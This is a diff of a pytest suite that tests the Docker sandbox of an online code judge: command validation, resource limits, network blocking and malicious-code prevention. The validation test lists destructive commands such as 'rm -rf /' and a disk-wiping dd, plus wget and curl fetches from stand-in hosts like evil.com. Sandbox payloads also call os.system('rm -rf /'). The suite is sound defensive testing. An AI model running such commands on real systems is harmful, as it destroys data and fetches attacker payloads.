@@ -1,275 +1,578 @@
 #!/usr/bin/env python3
-import requests
-import json
-import time
-import uuid
-
-# 服务器地址
-BASE_URL = "http://localhost:8000"
-
-def test_docker_security():
-    """测试Docker安全机制"""
-    print("开始测试Docker安全机制...")
-    
-    # 1. 管理员登录
-    print("1. 管理员登录...")
-    admin_data = {"username": "admin", "password": "admintestpassword"}
-    response = requests.post(f"{BASE_URL}/api/auth/login", json=admin_data)
-    if response.status_code != 200:
-        print(f"管理员登录失败: {response.status_code}")
-        return False
-    
-    admin_cookies = response.cookies
-    print("管理员登录成功")
-    
-    # 2. 创建测试题目
-    print("2. 创建测试题目...")
-    problem_id = f"docker_test_{uuid.uuid4().hex[:8]}"
-    problem_data = {
-        "id": problem_id,
-        "title": "Docker安全测试",
-        "description": "测试Docker安全机制",
-        "input_description": "输入一个整数n",
-        "output_description": "输出n的平方",
-        "samples": [
-            {"input": "5\n", "output": "25\n"}
-        ],
-        "testcases": [
-            {"input": "5\n", "output": "25\n"},
-            {"input": "10\n", "output": "100\n"}
-        ],
-        "constraints": "1 <= n <= 100",
-        "time_limit": 2.0,
-        "memory_limit": 64
-    }
-    
-    response = requests.post(f"{BASE_URL}/api/problems/", json=problem_data, cookies=admin_cookies)
-    if response.status_code != 200:
-        print(f"创建题目失败: {response.status_code}")
-        print(response.text)
-        return False
-    
-    print(f"题目创建成功: {problem_id}")
-    
-    # 3. 创建测试用户
-    print("3. 创建测试用户...")
-    user = f"docker_user_{uuid.uuid4().hex[:8]}"
-    user_data = {"username": user, "password": "test123"}
-    response = requests.post(f"{BASE_URL}/api/users/", json=user_data, cookies=admin_cookies)
-    if response.status_code != 200:
-        print(f"创建用户失败: {response.status_code}")
-        return False
-    
-    print(f"用户创建成功: {user}")
-    
-    # 4. 用户登录
-    print("4. 用户登录...")
-    response = requests.post(f"{BASE_URL}/api/auth/login", json=user_data)
-    if response.status_code != 200:
-        print(f"用户登录失败: {response.status_code}")
-        return False
-    
-    user_cookies = response.cookies
-    print("用户登录成功")
-    
-    # 5. 测试正常Python代码
-    print("5. 测试正常Python代码...")
-    normal_python_code = "n = int(input())\nprint(n * n)"
-    submission_data = {
-        "problem_id": problem_id,
-        "language": "python",
-        "code": normal_python_code
-    }
-    
-    response = requests.post(f"{BASE_URL}/api/submissions/", json=submission_data, cookies=user_cookies)
-    if response.status_code != 200:
-        print(f"提交正常代码失败: {response.status_code}")
-        print(response.text)
-        return False
-    
-    data = response.json()
-    normal_submission_id = data["data"]["submission_id"]
-    print(f"正常代码提交成功，提交ID: {normal_submission_id}")
-    
-    # 6. 等待评测完成
-    print("6. 等待正常代码评测完成...")
-    time.sleep(5)
-    
-    # 7. 获取正常代码评测结果
-    print("7. 获取正常代码评测结果...")
-    response = requests.get(f"{BASE_URL}/api/submissions/{normal_submission_id}", cookies=user_cookies)
-    if response.status_code != 200:
-        print(f"获取正常代码评测结果失败: {response.status_code}")
-        return False
-    
-    normal_result = response.json()
-    print(f"正常代码评测结果: {json.dumps(normal_result, indent=2, ensure_ascii=False)}")
-    
-    # 8. 测试恶意Python代码（尝试系统调用）
-    print("8. 测试恶意Python代码...")
-    malicious_python_code = '''
+import pytest
+import asyncio
+import tempfile
 import os
 import subprocess
-print("尝试执行系统命令...")
-os.system("ls /")
-subprocess.call(["echo", "恶意代码"])
-print("25")
-'''
+import time
+from app.docker_judge import DockerJudge
+
+
+class TestDockerSecurity:
+    """Docker安全机制测试"""
     
-    submission_data["code"] = malicious_python_code
-    response = requests.post(f"{BASE_URL}/api/submissions/", json=submission_data, cookies=user_cookies)
-    if response.status_code != 200:
-        print(f"提交恶意代码失败: {response.status_code}")
-        print(response.text)
-        return False
+    @pytest.fixture
+    def docker_judge(self):
+        """创建Docker评测器实例"""
+        return DockerJudge()
     
-    data = response.json()
-    malicious_submission_id = data["data"]["submission_id"]
-    print(f"恶意代码提交成功，提交ID: {malicious_submission_id}")
-    
-    # 9. 等待评测完成
-    print("9. 等待恶意代码评测完成...")
-    time.sleep(5)
-    
-    # 10. 获取恶意代码评测结果
-    print("10. 获取恶意代码评测结果...")
-    response = requests.get(f"{BASE_URL}/api/submissions/{malicious_submission_id}", cookies=user_cookies)
-    if response.status_code != 200:
-        print(f"获取恶意代码评测结果失败: {response.status_code}")
-        return False
-    
-    malicious_result = response.json()
-    print(f"恶意代码评测结果: {json.dumps(malicious_result, indent=2, ensure_ascii=False)}")
-    
-    # 11. 测试C++代码
-    print("11. 测试C++代码...")
-    cpp_code = '''
-#include <iostream>
-using namespace std;
+    @pytest.fixture
+    def temp_code_files(self):
+        """创建临时代码文件"""
+        with tempfile.TemporaryDirectory() as temp_dir:
+            # Python代码文件
+            python_code = """print("Hello, World!")"""
+            python_file = os.path.join(temp_dir, "main.py")
+            with open(python_file, 'w') as f:
+                f.write(python_code)
+            
+            # C++代码文件
+            cpp_code = """#include <iostream>
 int main() {
-    int n;
-    cin >> n;
-    cout << n * n << endl;
+    std::cout << "Hello, World!" << std::endl;
+    return 0;
+}"""
+            cpp_file = os.path.join(temp_dir, "main.cpp")
+            with open(cpp_file, 'w') as f:
+                f.write(cpp_code)
+            
+            yield {
+                "python": python_file,
+                "cpp": cpp_file,
+                "temp_dir": temp_dir
+            }
+    
+    def test_docker_availability(self, docker_judge):
+        """测试Docker可用性检查"""
+        # 检查Docker是否可用
+        assert hasattr(docker_judge, 'docker_available')
+        
+        # 如果Docker可用，应该能获取版本信息
+        if docker_judge.docker_available:
+            result = subprocess.run(
+                ["docker", "--version"],
+                capture_output=True,
+                text=True,
+                timeout=5
+            )
+            assert result.returncode == 0
+            assert "Docker version" in result.stdout
+    
+    def test_command_validation(self, docker_judge):
+        """测试命令过滤与安全校验"""
+        # 测试白名单命令
+        allowed_commands = [
+            "python main.py",
+            "python3 test.py",
+            "gcc -o main main.c",
+            "g++ -std=c++11 main.cpp",
+            "make build"
+        ]
+        
+        for cmd in allowed_commands:
+            assert docker_judge.validate_command(cmd), f"应该允许命令: {cmd}"
+        
+        # 测试黑名单命令
+        dangerous_commands = [
+            "rm -rf /",
+            "sudo rm -rf /",
+            "dd if=/dev/zero of=/dev/sda",
+            "chmod 777 /etc/passwd",
+            "mount /dev/sda1 /mnt",
+            "iptables -F",
+            "systemctl stop sshd",
+            "docker run --privileged",
+            "wget http://malicious.com/script.sh",
+            "curl -O http://evil.com/payload"
+        ]
+        
+        for cmd in dangerous_commands:
+            assert not docker_judge.validate_command(cmd), f"应该拒绝危险命令: {cmd}"
+        
+        # 测试危险参数
+        dangerous_params = [
+            "find . -exec rm {} \\;",
+            "find . -ok rm {} \\;",
+            "rm --recursive --force /",
+            "rm --no-preserve-root /",
+            "rm --preserve-root=0 /"
+        ]
+        
+        for cmd in dangerous_params:
+            assert not docker_judge.validate_command(cmd), f"应该拒绝危险参数: {cmd}"
+    
+    def test_dockerfile_creation(self, docker_judge, temp_code_files):
+        """测试Dockerfile创建"""
+        # 测试Python Dockerfile
+        python_dockerfile = docker_judge.create_dockerfile(
+            "python",
+            temp_code_files["python"],
+            "/app"
+        )
+        assert os.path.exists(python_dockerfile)
+    
+        with open(python_dockerfile, 'r') as f:
+            content = f.read()
+            assert "FROM python:3.9-slim" in content
+            assert "WORKDIR /app" in content
+            assert "COPY main.py ." in content
+            assert 'CMD ["python", "main.py"]' in content
+    
+        # 测试C++ Dockerfile
+        cpp_dockerfile = docker_judge.create_dockerfile(
+            "cpp",
+            temp_code_files["cpp"],
+            "/app"
+        )
+        assert os.path.exists(cpp_dockerfile)
+    
+        with open(cpp_dockerfile, 'r') as f:
+            content = f.read()
+            assert "FROM gcc:11" in content
+            assert "WORKDIR /app" in content
+            assert "COPY main.cpp ." in content
+            assert "RUN g++ -o main main.cpp" in content
+            assert 'CMD ["./main"]' in content
+        
+        # 清理
+        if os.path.exists(python_dockerfile):
+            os.remove(python_dockerfile)
+        if os.path.exists(cpp_dockerfile):
+            os.remove(cpp_dockerfile)
+    
+    @pytest.mark.asyncio
+    async def test_docker_sandbox_isolation(self, docker_judge, temp_code_files):
+        """测试Docker沙箱隔离"""
+        if not docker_judge.docker_available:
+            pytest.skip("Docker不可用，跳过沙箱测试")
+        
+        # 测试Python代码在Docker中运行
+        result = await docker_judge.run_in_docker(
+            language="python",
+            code_file=temp_code_files["python"],
+            input_data="",
+            time_limit=5.0,
+            memory_limit=128,
+            container_name="test_python_sandbox"
+        )
+        
+        assert result["status"] == "AC"
+        assert "Hello, World!" in result["output"]
+        
+        # 测试C++代码在Docker中运行
+        result = await docker_judge.run_in_docker(
+            language="cpp",
+            code_file=temp_code_files["cpp"],
+            input_data="",
+            time_limit=5.0,
+            memory_limit=128,
+            container_name="test_cpp_sandbox"
+        )
+        
+        assert result["status"] == "AC"
+        assert "Hello, World!" in result["output"]
+    
+    @pytest.mark.asyncio
+    async def test_memory_time_limits(self, docker_judge):
+        """测试内存和时间限制"""
+        if not docker_judge.docker_available:
+            pytest.skip("Docker不可用，跳过限制测试")
+        
+        with tempfile.TemporaryDirectory() as temp_dir:
+            # 测试内存限制 - 创建会消耗大量内存的代码
+            memory_test_code = """
+import sys
+import array
+
+# 尝试分配超过限制的内存
+try:
+    # 尝试分配200MB内存（超过128MB限制）
+    large_array = array.array('B', [0] * (200 * 1024 * 1024))
+    print("Memory allocation succeeded")
+except MemoryError:
+    print("Memory limit enforced")
+"""
+            memory_file = os.path.join(temp_dir, "memory_test.py")
+            with open(memory_file, 'w') as f:
+                f.write(memory_test_code)
+            
+            result = await docker_judge.run_in_docker(
+                language="python",
+                code_file=memory_file,
+                input_data="",
+                time_limit=10.0,
+                memory_limit=128,  # 128MB限制
+                container_name="test_memory_limit"
+            )
+            
+            # 应该因为内存超限而失败
+            assert result["status"] in ["MLE", "RE"]
+            
+            # 测试时间限制 - 创建会超时的代码
+            timeout_test_code = """
+import time
+import sys
+
+# 尝试运行超过时间限制
+time.sleep(10)  # 睡眠10秒，超过5秒限制
+print("Should not reach here")
+"""
+            timeout_file = os.path.join(temp_dir, "timeout_test.py")
+            with open(timeout_file, 'w') as f:
+                f.write(timeout_test_code)
+            
+            result = await docker_judge.run_in_docker(
+                language="python",
+                code_file=timeout_file,
+                input_data="",
+                time_limit=5.0,  # 5秒限制
+                memory_limit=128,
+                container_name="test_time_limit"
+            )
+            
+            # 应该因为超时而失败
+            assert result["status"] == "TLE"
+    
+    @pytest.mark.asyncio
+    async def test_security_restrictions(self, docker_judge):
+        """测试安全限制"""
+        if not docker_judge.docker_available:
+            pytest.skip("Docker不可用，跳过安全测试")
+
+        with tempfile.TemporaryDirectory() as temp_dir:
+            # 测试网络访问限制
+            network_test_code = """
+import socket
+try:
+    # 尝试连接外部网络
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(1)
+    result = sock.connect_ex(('8.8.8.8', 53))
+    print(f"Network access result: {result}")
+    sock.close()
+except Exception as e:
+    print(f"Network access blocked: {e}")
+"""
+            network_file = os.path.join(temp_dir, "network_test.py")
+            with open(network_file, 'w') as f:
+                f.write(network_test_code)
+
+            result = await docker_judge.run_in_docker(
+                language="python",
+                code_file=network_file,
+                input_data="",
+                time_limit=5.0,
+                memory_limit=128,
+                container_name="test_network_restriction"
+            )
+
+            # 应该被阻止访问网络
+            assert result["status"] == "AC"
+            assert "Network access blocked" in result["output"] or "Network access result: 101" in result["output"]
+    
+    @pytest.mark.asyncio
+    async def test_malicious_code_prevention(self, docker_judge):
+        """测试恶意代码防护"""
+        if not docker_judge.docker_available:
+            pytest.skip("Docker不可用，跳过恶意代码测试")
+
+        with tempfile.TemporaryDirectory() as temp_dir:
+            # 测试危险命令执行
+            dangerous_test_code = """
+import os
+import subprocess
+
+try:
+    # 尝试执行危险命令（应该被命令过滤阻止）
+    result = os.system('rm -rf /')
+    print(f"Dangerous command result: {result}")
+except Exception as e:
+    print(f"Dangerous command blocked: {e}")
+
+try:
+    # 尝试使用subprocess执行危险命令
+    result = subprocess.run(['rm', '-rf', '/'], capture_output=True, text=True)
+    print(f"Dangerous subprocess result: {result.returncode}")
+except Exception as e:
+    print(f"Dangerous subprocess blocked: {e}")
+"""
+            dangerous_file = os.path.join(temp_dir, "dangerous_test.py")
+            with open(dangerous_file, 'w') as f:
+                f.write(dangerous_test_code)
+
+            result = await docker_judge.run_in_docker(
+                language="python",
+                code_file=dangerous_file,
+                input_data="",
+                time_limit=5.0,
+                memory_limit=128,
+                container_name="test_dangerous_commands"
+            )
+
+            # 应该被阻止执行危险命令
+            assert result["status"] == "AC"
+            assert ("Dangerous command blocked" in result["output"] or 
+                   "Dangerous subprocess blocked" in result["output"] or
+                   "Dangerous command result: 256" in result["output"] or
+                   "Dangerous subprocess result: 1" in result["output"])
+    
+    @pytest.mark.asyncio
+    async def test_normal_code_execution(self, docker_judge):
+        """测试正常代码执行"""
+        if not docker_judge.docker_available:
+            pytest.skip("Docker不可用，跳过正常代码测试")
+        
+        with tempfile.TemporaryDirectory() as temp_dir:
+            # 测试正常Python代码
+            normal_python_code = """
+# 正常计算代码
+a = 10
+b = 20
+result = a + b
+print(f"{a} + {b} = {result}")
+
+# 正常循环
+for i in range(5):
+    print(f"Count: {i}")
+
+# 正常字符串操作
+text = "Hello, Docker Security!"
+print(text.upper())
+print(text.lower())
+"""
+            normal_python_file = os.path.join(temp_dir, "normal_python.py")
+            with open(normal_python_file, 'w') as f:
+                f.write(normal_python_code)
+            
+            result = await docker_judge.run_in_docker(
+                language="python",
+                code_file=normal_python_file,
+                input_data="",
+                time_limit=5.0,
+                memory_limit=128,
+                container_name="test_normal_python"
+            )
+            
+            assert result["status"] == "AC"
+            assert "10 + 20 = 30" in result["output"]
+            assert "Count: 0" in result["output"]
+            assert "HELLO, DOCKER SECURITY!" in result["output"]
+            
+            # 测试正常C++代码
+            normal_cpp_code = """
+#include <iostream>
+#include <string>
+#include <vector>
+
+int main() {
+    // 正常计算
+    int a = 15, b = 25;
+    int result = a * b;
+    std::cout << a << " * " << b << " = " << result << std::endl;
+    
+    // 正常循环
+    for (int i = 0; i < 3; i++) {
+        std::cout << "Loop " << i << std::endl;
+    }
+    
+    // 正常字符串操作
+    std::string text = "C++ in Docker";
+    std::cout << "Length: " << text.length() << std::endl;
+    
     return 0;
 }
-'''
+"""
+            normal_cpp_file = os.path.join(temp_dir, "normal_cpp.cpp")
+            with open(normal_cpp_file, 'w') as f:
+                f.write(normal_cpp_code)
+            
+            result = await docker_judge.run_in_docker(
+                language="cpp",
+                code_file=normal_cpp_file,
+                input_data="",
+                time_limit=5.0,
+                memory_limit=128,
+                container_name="test_normal_cpp"
+            )
+            
+            assert result["status"] == "AC"
+            assert "15 * 25 = 375" in result["output"]
+            assert "Loop 0" in result["output"]
+            assert "Length: 13" in result["output"]
     
-    submission_data["code"] = cpp_code
-    submission_data["language"] = "cpp"
-    response = requests.post(f"{BASE_URL}/api/submissions/", json=submission_data, cookies=user_cookies)
-    if response.status_code != 200:
-        print(f"提交C++代码失败: {response.status_code}")
-        print(response.text)
-        return False
+    @pytest.mark.asyncio
+    async def test_input_output_handling(self, docker_judge):
+        """测试输入输出处理"""
+        if not docker_judge.docker_available:
+            pytest.skip("Docker不可用，跳过IO测试")
+        
+        with tempfile.TemporaryDirectory() as temp_dir:
+            # 测试Python输入输出
+            io_python_code = """
+# 读取输入并处理
+input_data = input()
+numbers = list(map(int, input_data.split()))
+total = sum(numbers)
+print(f"Sum: {total}")
+
+# 处理多行输入
+for i in range(3):
+    line = input()
+    print(f"Line {i+1}: {line}")
+"""
+            io_python_file = os.path.join(temp_dir, "io_python.py")
+            with open(io_python_file, 'w') as f:
+                f.write(io_python_code)
+            
+            input_data = "1 2 3 4 5\nHello\nWorld\nTest"
+            result = await docker_judge.run_in_docker(
+                language="python",
+                code_file=io_python_file,
+                input_data=input_data,
+                time_limit=5.0,
+                memory_limit=128,
+                container_name="test_io_python"
+            )
+            
+            assert result["status"] == "AC"
+            assert "Sum: 15" in result["output"]
+            assert "Line 1: Hello" in result["output"]
+            assert "Line 2: World" in result["output"]
+            assert "Line 3: Test" in result["output"]
+            
+            # 测试C++输入输出
+            io_cpp_code = """
+#include <iostream>
+#include <string>
+#include <sstream>
+
+int main() {
+    std::string input;
+    std::getline(std::cin, input);
     
-    data = response.json()
-    cpp_submission_id = data["data"]["submission_id"]
-    print(f"C++代码提交成功，提交ID: {cpp_submission_id}")
+    std::istringstream iss(input);
+    int num, sum = 0;
+    while (iss >> num) {
+        sum += num;
+    }
+    std::cout << "Sum: " << sum << std::endl;
     
-    # 12. 等待C++评测完成
-    print("12. 等待C++代码评测完成...")
-    time.sleep(8)  # C++编译需要更多时间
+    // 读取多行
+    for (int i = 0; i < 2; i++) {
+        std::getline(std::cin, input);
+        std::cout << "Line " << (i+1) << ": " << input << std::endl;
+    }
     
-    # 13. 获取C++评测结果
-    print("13. 获取C++代码评测结果...")
-    response = requests.get(f"{BASE_URL}/api/submissions/{cpp_submission_id}", cookies=user_cookies)
-    if response.status_code != 200:
-        print(f"获取C++代码评测结果失败: {response.status_code}")
-        return False
+    return 0;
+}
+"""
+            io_cpp_file = os.path.join(temp_dir, "io_cpp.cpp")
+            with open(io_cpp_file, 'w') as f:
+                f.write(io_cpp_code)
+            
+            input_data = "10 20 30\nFirst line\nSecond line"
+            result = await docker_judge.run_in_docker(
+                language="cpp",
+                code_file=io_cpp_file,
+                input_data=input_data,
+                time_limit=5.0,
+                memory_limit=128,
+                container_name="test_io_cpp"
+            )
+            
+            assert result["status"] == "AC"
+            assert "Sum: 60" in result["output"]
+            assert "Line 1: First line" in result["output"]
+            assert "Line 2: Second line" in result["output"]
     
-    cpp_result = response.json()
-    print(f"C++代码评测结果: {json.dumps(cpp_result, indent=2, ensure_ascii=False)}")
+    @pytest.mark.asyncio
+    async def test_judge_test_case_integration(self, docker_judge):
+        """测试完整的评测集成"""
+        if not docker_judge.docker_available:
+            pytest.skip("Docker不可用，跳过集成测试")
+        
+        # 测试标准评测模式
+        result = await docker_judge.judge_test_case(
+            code="print('Hello, World!')",
+            language="python",
+            input_data="",
+            expected_output="Hello, World!",
+            time_limit=5.0,
+            memory_limit=128,
+            judge_mode="standard"
+        )
+        
+        assert result.status == "AC"
+        assert result.time_used > 0
+        assert result.memory_used >= 0
+        
+        # 测试严格评测模式
+        result = await docker_judge.judge_test_case(
+            code="print('Hello, World!')",
+            language="python",
+            input_data="",
+            expected_output="Hello, World!",
+            time_limit=5.0,
+            memory_limit=128,
+            judge_mode="strict"
+        )
+        
+        assert result.status == "AC"
+        
+        # 测试错误输出
+        result = await docker_judge.judge_test_case(
+            code="print('Wrong Output')",
+            language="python",
+            input_data="",
+            expected_output="Hello, World!",
+            time_limit=5.0,
+            memory_limit=128,
+            judge_mode="standard"
+        )
+        
+        assert result.status == "WA"
+        assert result.actual_output == "Wrong Output"
+        assert result.expected_output == "Hello, World!"
     
-    # 14. 测试内存超限
-    print("14. 测试内存超限...")
-    memory_hog_code = '''
-n = int(input())
-# 尝试分配大量内存
-data = [0] * (n * 1000000)  # 分配大量内存
-print(n * n)
-'''
-    
-    submission_data["code"] = memory_hog_code
-    submission_data["language"] = "python"
-    response = requests.post(f"{BASE_URL}/api/submissions/", json=submission_data, cookies=user_cookies)
-    if response.status_code != 200:
-        print(f"提交内存超限代码失败: {response.status_code}")
-        print(response.text)
-        return False
-    
-    data = response.json()
-    memory_submission_id = data["data"]["submission_id"]
-    print(f"内存超限代码提交成功，提交ID: {memory_submission_id}")
-    
-    # 15. 等待内存超限评测完成
-    print("15. 等待内存超限代码评测完成...")
-    time.sleep(5)
-    
-    # 16. 获取内存超限评测结果
-    print("16. 获取内存超限代码评测结果...")
-    response = requests.get(f"{BASE_URL}/api/submissions/{memory_submission_id}", cookies=user_cookies)
-    if response.status_code != 200:
-        print(f"获取内存超限代码评测结果失败: {response.status_code}")
-        return False
-    
-    memory_result = response.json()
-    print(f"内存超限代码评测结果: {json.dumps(memory_result, indent=2, ensure_ascii=False)}")
-    
-    # 17. 验证结果
-    print("17. 验证Docker安全机制...")
-    
-    # 检查正常代码应该通过
-    normal_score = normal_result["data"]["score"]
-    normal_counts = normal_result["data"]["counts"]
-    
-    # 检查恶意代码应该被阻止或失败
-    malicious_score = malicious_result["data"]["score"]
-    
-    # 检查C++代码应该通过
-    cpp_score = cpp_result["data"]["score"]
-    
-    # 检查内存超限应该被检测
-    memory_score = memory_result["data"]["score"]
-    
-    print(f"正常代码得分: {normal_score}/{normal_counts}")
-    print(f"恶意代码得分: {malicious_score}/{normal_counts}")
-    print(f"C++代码得分: {cpp_score}/{normal_counts}")
-    print(f"内存超限代码得分: {memory_score}/{normal_counts}")
-    
-    # 验证安全机制
-    security_ok = True
-    
-    if normal_score != normal_counts:
-        print("❌ 正常代码应该通过")
-        security_ok = False
-    
-    if malicious_score >= normal_counts:
-        print("❌ 恶意代码应该被阻止")
-        security_ok = False
-    
-    if cpp_score != normal_counts:
-        print("❌ C++代码应该通过")
-        security_ok = False
-    
-    if memory_score >= normal_counts:
-        print("❌ 内存超限应该被检测")
-        security_ok = False
-    
-    if security_ok:
-        print("✅ Docker安全机制测试通过！")
-        return True
-    else:
-        print("❌ Docker安全机制测试失败！")
-        return False
+    @pytest.mark.asyncio
+    async def test_cleanup_containers(self, docker_judge):
+        """测试容器清理"""
+        if not docker_judge.docker_available:
+            pytest.skip("Docker不可用，跳过清理测试")
+        
+        # 运行一些测试容器
+        with tempfile.TemporaryDirectory() as temp_dir:
+            test_code = "print('Cleanup test')"
+            test_file = os.path.join(temp_dir, "cleanup_test.py")
+            with open(test_file, 'w') as f:
+                f.write(test_code)
+            
+            # 运行多个容器
+            for i in range(3):
+                await docker_judge.run_in_docker(
+                    language="python",
+                    code_file=test_file,
+                    input_data="",
+                    time_limit=5.0,
+                    memory_limit=128,
+                    container_name=f"cleanup_test_{i}"
+                )
+            
+            # 清理容器
+            await docker_judge.cleanup_containers()
+            
+            # 验证容器已被清理
+            result = subprocess.run(
+                ["docker", "ps", "-a", "--filter", "name=oj_judge_", "--format", "{{.Names}}"],
+                capture_output=True,
+                text=True,
+                timeout=5
+            )
+            
+            # 应该没有评测容器残留
+            assert not result.stdout.strip() or "oj_judge_" not in result.stdout
+
 
 if __name__ == "__main__":
-    try:
-        success = test_docker_security()
-        if success:
-            print("\n🎉 Docker安全机制测试通过！系统安全隔离工作正常。")
-        else:
-            print("\n💥 Docker安全机制测试失败！系统安全隔离存在问题。")
-    except Exception as e:
-        print(f"\n💥 测试过程中发生错误: {e}")
-        import traceback
-        traceback.print_exc() 
+    # 运行所有测试
+    pytest.main([__file__, "-v"]) 
